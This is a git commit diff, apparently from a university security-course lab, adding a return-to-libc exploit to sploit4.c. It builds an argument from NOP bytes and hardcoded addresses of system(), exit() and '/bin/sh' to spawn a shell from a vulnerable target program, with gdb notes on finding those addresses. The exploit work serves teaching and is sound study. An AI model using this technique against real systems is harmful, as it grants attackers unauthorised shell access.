974ee4822f8087e6fbda34ec2499e29ec7ae75e0
Stecodeven <STEVEN.ZZP1@gmail.com>
2021-12-09 22:53:30 -0500

    sploit4 pass

--- sploits/sploit4.c
+++ sploits/sploit4.c
@@ -12,8 +12,22 @@ int main(void)
   char *args[3]; 
   char *env[1];
   
+  char str[20];
+  memset(str, 0, 20);
+  for (int i = 0; i < 8; i++)
+  {
+  	strcat(str, "\x90");
+  }  
+  char *system = "\xb0\x2d\xe4\xb7";
+  char *exit = "\xe0\x69\xe3\xb7";
+  char *bin_sh = "\x2b\x3b\xf6\xb7";
+
+  strcat(str, system);
+  strcat(str, exit);
+  strcat(str, bin_sh);
+
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = str; 
   args[2] = NULL;
   
   env[0] = NULL;
@@ -22,5 +36,23 @@ int main(void)
 
   return 0;
 }
+
+/*
+print system
+ 0xb7e42db0 <__libc_system>
+
+\xb0\x2d\xe4\xb7
+
+print exit 
+  0xb7e369e0 
+  \xe0\x69\xe3\xb7
+
+"/bin/sh"
+find 0xb7e42db0, +999999999, "/bin/sh"
+  0xb7f63b2b
+
+\x2b\x3b\xf6\xb7
+
+*/
 
 
